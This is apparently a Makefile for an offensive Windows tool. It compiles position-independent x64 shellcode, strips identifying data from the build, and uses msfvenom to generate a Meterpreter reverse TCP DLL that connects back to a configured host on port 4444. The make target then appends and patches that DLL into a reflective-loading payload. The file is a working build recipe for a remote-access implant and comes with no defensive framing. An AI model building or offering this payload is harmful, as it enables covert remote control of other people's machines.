CCX64	= x86_64-w64-mingw32-gcc

CFLAGS	= -O0 -fno-asynchronous-unwind-tables -nostdlib
CFLAGS 	+= -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS  += -s -ffunction-sections -falign-jumps=1 -w
CFLAGS	+= -falign-labels=1 -fPIC -Wl,-TScripts/Linker.ld
CFLAGS	+= -Wl,-s,--no-seh,--enable-stdcall-fixup


EXECUTABLE_X64 = bin/Shellcode.x64.exe
RAWBINARY_X64  = bin/Shellcode.x64.bin

LHOST = eth0
LPORT = 4444

all: x64

x64: clean
	@ echo "[*] Compile assembly ..."
	@ nasm -f win64 src/asm.asm -o bin/asm.x64.o

	@ echo "[*] Compile x64 executable..."
	@ $(CCX64) src/*.c bin/asm.x64.o -o $(EXECUTABLE_X64) $(CFLAGS) $(LFLAGS) -Iinclude -masm=intel

	@ echo "[*] Extract shellcode: $(RAWBINARY_X64)"
	@ python3 Scripts/extract.py -f $(EXECUTABLE_X64) -o $(RAWBINARY_X64) -s 0
	@ echo "[+] Bootstrap shellcode is $$(ls -la $(RAWBINARY_X64)  | awk '{print $$5}') bytes"
	@ rm $(EXECUTABLE_X64)

	@ echo "[+] ====================Generating meterpreter dll===================="
	@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$(LHOST) LPORT=$(LPORT) -f dll EXITFUNC=thread -o bin/msf
	@ python3 Scripts/extract.py -f bin/msf -o bin/Reflective -s 2
	@ echo "[+] Extracting meterpreter dll from the template"
	@ echo "[+] Meterpreter is $$(ls -la bin/Reflective  | awk '{print $$5}') bytes"
	@ cat bin/Reflective >> $(RAWBINARY_X64)
	@ python3 Scripts/patch.py $(RAWBINARY_X64) bin/Reflective
	@ rm bin/msf bin/Reflective bin/asm.x64.o
	@ echo "[+] ==============================Done!==============================="

	@ echo "[+] Shellcode+DLL is $$(ls -la $(RAWBINARY_X64)  | awk '{print $$5}') bytes"


clean:
	@ rm -rf Bin/*.o
	@ rm -rf Bin/*.bin
	@ rm -rf Bin/*.exe
